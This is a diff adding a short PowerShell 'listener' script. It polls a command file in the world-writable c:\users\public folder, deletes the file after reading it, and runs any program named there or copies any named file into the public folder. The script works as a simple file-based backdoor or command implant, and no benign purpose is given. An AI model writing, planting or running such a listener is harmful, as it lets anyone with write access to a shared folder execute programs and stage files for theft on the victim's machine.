@@ -1,0 +1,29 @@
+write-host "Listener Started"
+while(1)
+    {
+        start-sleep -m 200
+        #write-host "Try to read file with command"
+        Try
+            {
+                $command =  gc "c:\\users\\public\\commands.txt" -ErrorAction Stop
+                $lastMod = (Get-Item "c:\\users\\public\\commands.txt").LastWriteTime;
+                write-host "readed"
+                
+            }
+        Catch
+            {
+                Continue
+            }
+        $NewLastMod = (Get-Item "c:\\users\\public\\commands.txt").LastWriteTime;
+        
+        $command = $command -split "}{}{}{"
+        del "c:\\users\\public\\commands.txt"
+        if ($command[0] -eq "exec")
+            {
+                Start-Process $command[1]
+            }
+        elseif ($command[0] -eq "upload")
+            {
+                copy $command[1] "c:\\users\\public\\"
+            }
+    }
